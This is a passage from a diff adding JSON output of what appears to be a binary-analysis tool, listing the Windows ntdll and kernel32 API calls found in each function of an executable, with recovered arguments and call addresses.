+ "0x140024c10": [
+  {
+   "call_addr": 5368860114,
+   "dll": "ntdll.dll",
+   "api_raw": "NtUnmapViewOfSection",
+   "api": "NtUnmapViewOfSection",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 18446744073709551615,
+     "text": "-1"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368860123,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368860132,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368860453,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x140025080": [],
+ "0x140025180": [],
+ "0x1400251d0": [],
+ "0x140025250": [],
+ "0x1400252d0": [],
+ "0x140025350": [],
+ "0x1400256c0": [],
+ "0x140025a50": [],
+ "0x140025ae0": [],
+ "0x140025b33": [],
+ "0x140025b58": [],
+ "0x140025b61": [],
+ "0x140025b6a": [],
+ "0x140025b7c": [],
+ "0x140025b85": [],
+ "0x140025b97": [],
+ "0x140025ba0": [],
+ "0x140025ba9": [],
+ "0x140025bb2": [],
+ "0x140025bbe": [],
+ "0x140025bd0": [],
+ "0x140025bd9": [],
+ "0x140025be2": [],
+ "0x140025be8": [],
+ "0x140025bf4": [],
+ "0x140025c00": [],
+ "0x140025c0c": [],
+ "0x140025c12": [],
+ "0x140025c1e": [],
+ "0x140025c30": [],
+ "0x140025c3c": [],
+ "0x140025c48": [],
+ "0x140025c54": [],
+ "0x140025c5a": [],
+ "0x140025c60": [],
+ "0x140025d26": [],
+ "0x140025d2f": [],
+ "0x140025d38": [],
+ "0x140025d41": [],
+ "0x140025d4a": [],
+ "0x140025e10": [],
+ "0x1400260b0": [],
+ "0x140026220": [
+  {
+   "call_addr": 5368865648,
+   "dll": "ntdll.dll",
+   "api_raw": "LdrGetProcedureAddress",
+   "api": "LdrGetProcedureAddress",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x50)"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0xa8)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368865710,
+   "dll": "ntdll.dll",
+   "api_raw": "LdrGetProcedureAddress",
+   "api": "LdrGetProcedureAddress",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x40)"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0xa0)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368865847,
+   "dll": "ntdll.dll",
+   "api_raw": "LdrLoadDll",
+   "api": "LdrLoadDll",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x60)"
+    },
+    {
+     "name": "arg3",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x98)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368865974,
+   "dll": "ntdll.dll",
+   "api_raw": "LdrUnloadDll",
+   "api": "LdrUnloadDll",
+   "args": []
+  }
+ ],
+ "0x140026510": [],
+ "0x140026530": [],
+ "0x140026730": [],
+ "0x140026760": [],
+ "0x1400267b0": [
+  {
+   "call_addr": 5368867026,
+   "dll": "ntdll.dll",
+   "api_raw": "NtDeviceIoControlFile",
+   "api": "NtDeviceIoControlFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368867447,
+   "dll": "ntdll.dll",
+   "api_raw": "NtOpenFile",
+   "api": "NtOpenFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 1048577,
+     "text": "0x100001"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368867639,
+   "dll": "ntdll.dll",
+   "api_raw": "NtOpenFile",
+   "api": "NtOpenFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 1048577,
+     "text": "0x100001"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368867701,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x140026d80": [],
+ "0x140027010": [],
+ "0x140027510": [
+  {
+   "call_addr": 5368871179,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlQueryPerformanceCounter",
+   "api": "RtlQueryPerformanceCounter",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x1e0)"
+    }
+   ]
+  }
+ ],
+ "0x140027930": [
+  {
+   "call_addr": 5368871501,
+   "dll": "ntdll.dll",
+   "api_raw": "NtAlertThreadByThreadId",
+   "api": "NtAlertThreadByThreadId",
+   "args": []
+  },
+  {
+   "call_addr": 5368871565,
+   "dll": "ntdll.dll",
+   "api_raw": "NtAlertThreadByThreadId",
+   "api": "NtAlertThreadByThreadId",
+   "args": []
+  }
+ ],
+ "0x140027aa0": [],
+ "0x140027b30": [
+  {
+   "call_addr": 5368872363,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlGetSystemTimePrecise",
+   "api": "RtlGetSystemTimePrecise",
+   "args": []
+  },
+  {
+   "call_addr": 5368872518,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWaitForAlertByThreadId",
+   "api": "NtWaitForAlertByThreadId",
+   "args": []
+  }
+ ],
+ "0x140027ee0": [],
+ "0x140027f50": [],
+ "0x140028000": [],
+ "0x140028010": [
+  {
+   "call_addr": 5368873003,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlQueryPerformanceFrequency",
+   "api": "RtlQueryPerformanceFrequency",
+   "args": []
+  }
+ ],
+ "0x1400280b0": [],
+ "0x1400280e0": [
+  {
+   "call_addr": 5368873227,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg2",
+     "kind": "pointer",
+     "value": 5369202848,
+     "text": "0x1400788a0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  }
+ ],
+ "0x140028140": [
+  {
+   "call_addr": 5368873319,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg2",
+     "kind": "pointer",
+     "value": 5369202848,
+     "text": "0x1400788a0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  }
+ ],
+ "0x140028190": [],
+ "0x1400281d0": [
+  {
+   "call_addr": 5368873450,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlReportSilentProcessExit",
+   "api": "RtlReportSilentProcessExit",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 1,
+     "text": "1"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368873463,
+   "dll": "ntdll.dll",
+   "api_raw": "NtTerminateProcess",
+   "api": "NtTerminateProcess",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 1,
+     "text": "1"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368873503,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWaitForSingleObject",
+   "api": "NtWaitForSingleObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  }
+ ],
+ "0x140028240": [
+  {
+   "call_addr": 5368873691,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlEnterCriticalSection",
+   "api": "RtlEnterCriticalSection",
+   "args": []
+  },
+  {
+   "call_addr": 5368873933,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlEqualUnicodeString",
+   "api": "RtlEqualUnicodeString",
+   "args": []
+  },
+  {
+   "call_addr": 5368873990,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlEqualUnicodeString",
+   "api": "RtlEqualUnicodeString",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x20)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368874059,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlEqualUnicodeString",
+   "api": "RtlEqualUnicodeString",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x20)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368874648,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlLeaveCriticalSection",
+   "api": "RtlLeaveCriticalSection",
+   "args": []
+  }
+ ],
+ "0x140028760": [
+  {
+   "call_addr": 5368874917,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryInformationProcess",
+   "api": "NtQueryInformationProcess",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 3,
+     "text": "3"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x58)"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 88,
+     "text": "0x58"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368875015,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368875031,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368875058,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368875093,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368875123,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x140028890": [
+  {
+   "call_addr": 5368875288,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWaitForSingleObject",
+   "api": "NtWaitForSingleObject",
+   "args": [
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368875384,
+   "dll": "ntdll.dll",
+   "api_raw": "NtWaitForSingleObject",
+   "api": "NtWaitForSingleObject",
+   "args": [
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368875449,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryInformationProcess",
+   "api": "NtQueryInformationProcess",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x28)"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 48,
+     "text": "0x30"
+    }
+   ]
+  }
+ ],
+ "0x140028a10": [],
+ "0x140028ad0": [
+  {
+   "call_addr": 5368875780,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlEqualUnicodeString",
+   "api": "RtlEqualUnicodeString",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x10)"
+    },
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp-0x20)"
+    }
+   ]
+  }
+ ],
+ "0x140028b20": [
+  {
+   "call_addr": 5368876261,
+   "dll": "ntdll.dll",
+   "api_raw": "NtCreateNamedPipeFile",
+   "api": "NtCreateNamedPipeFile",
+   "args": []
+  },
+  {
+   "call_addr": 5368876601,
+   "dll": "ntdll.dll",
+   "api_raw": "NtOpenFile",
+   "api": "NtOpenFile",
+   "args": []
+  },
+  {
+   "call_addr": 5368876670,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368876902,
+   "dll": "ntdll.dll",
+   "api_raw": "NtOpenFile",
+   "api": "NtOpenFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 1048576,
+     "text": "0x100000"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368877441,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368877514,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368877555,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x140029390": [],
+ "0x14002a440": [],
+ "0x14002b630": [
+  {
+   "call_addr": 5368887046,
+   "dll": "kernel32.dll",
+   "api_raw": "CreateProcessW",
+   "api": "CreateProcess",
+   "args": [
+    {
+     "name": "lpApplicationName",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "lpCommandLine",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "lpProcessAttributes",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "lpThreadAttributes",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "bInheritHandles",
+     "kind": "const",
+     "value": 1,
+     "text": "1"
+    },
+    {
+     "name": "dwCreationFlags",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "lpEnvironment",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "lpCurrentDirectory",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "lpStartupInfo",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "lpProcessInformation",
+     "kind": "unknown",
+     "text": "<unknown>"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368887270,
+   "dll": "kernel32.dll",
+   "api_raw": "CreateProcessW",
+   "api": "CreateProcess",
+   "args": [
+    {
+     "name": "lpApplicationName",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "lpCommandLine",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "lpProcessAttributes",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "lpThreadAttributes",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "bInheritHandles",
+     "kind": "const",
+     "value": 1,
+     "text": "1"
+    },
+    {
+     "name": "dwCreationFlags",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "lpEnvironment",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "lpCurrentDirectory",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "lpStartupInfo",
+     "kind": "unknown",
+     "text": "<unknown>"
+    },
+    {
+     "name": "lpProcessInformation",
+     "kind": "unknown",
+     "text": "<unknown>"
+    }
+   ]
+  }
+ ],
+ "0x14002b880": [
+  {
+   "call_addr": 5368887890,
+   "dll": "ntdll.dll",
+   "api_raw": "NtQueryDirectoryFile",
+   "api": "NtQueryDirectoryFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg2",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 0,
+     "text": "0"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368888119,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368888611,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368888643,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368888768,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368888988,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368889036,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368889214,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368890008,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368890044,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368890062,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368890113,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368890147,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368890172,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368890206,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368890248,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x14002c3c0": [
+  {
+   "call_addr": 5368892402,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368892481,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368892642,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368892699,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368892714,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368892739,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368892754,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368892784,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368892799,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368893002,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368893017,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368893376,
+   "dll": "ntdll.dll",
+   "api_raw": "NtOpenFile",
+   "api": "NtOpenFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 1048579,
+     "text": "0x100003"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368893489,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368893570,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368893606,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368893621,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368893649,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368893664,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368893694,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368893709,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368893908,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368893923,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368896249,
+   "dll": "ntdll.dll",
+   "api_raw": "NtOpenFile",
+   "api": "NtOpenFile",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 1048579,
+     "text": "0x100003"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368896769,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368908946,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368908961,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368908991,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368909006,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368909094,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368909109,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368909371,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368909386,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368909477,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368909492,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368909513,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368909528,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  }
+ ],
+ "0x14002cc8f": [
+  {
+   "call_addr": 5368895375,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlEnterCriticalSection",
+   "api": "RtlEnterCriticalSection",
+   "args": []
+  },
+  {
+   "call_addr": 5368895620,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlEqualUnicodeString",
+   "api": "RtlEqualUnicodeString",
+   "args": [
+    {
+     "name": "arg0",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x104e8)"
+    },
+    {
+     "name": "arg1",
+     "kind": "stack_addr",
+     "text": "&local(rbp+0x106e0)"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368897412,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlLeaveCriticalSection",
+   "api": "RtlLeaveCriticalSection",
+   "args": []
+  },
+  {
+   "call_addr": 5368897473,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368897522,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368897558,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368897573,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368897601,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368897616,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368897650,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368897665,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368897869,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368897884,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368898865,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368898914,
+   "dll": "ntdll.dll",
+   "api_raw": "NtSetInformationObject",
+   "api": "NtSetInformationObject",
+   "args": [
+    {
+     "name": "arg1",
+     "kind": "const",
+     "value": 4,
+     "text": "4"
+    },
+    {
+     "name": "arg3",
+     "kind": "const",
+     "value": 2,
+     "text": "2"
+    }
+   ]
+  },
+  {
+   "call_addr": 5368898950,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368898965,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368898993,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368899008,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368899045,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368899060,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368899253,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368899268,
+   "dll": "ntdll.dll",
+   "api_raw": "NtClose",
+   "api": "NtClose",
+   "args": []
+  },
+  {
+   "call_addr": 5368900072,
+   "dll": "ntdll.dll",
+   "api_raw": "RtlLeaveCriticalSection",
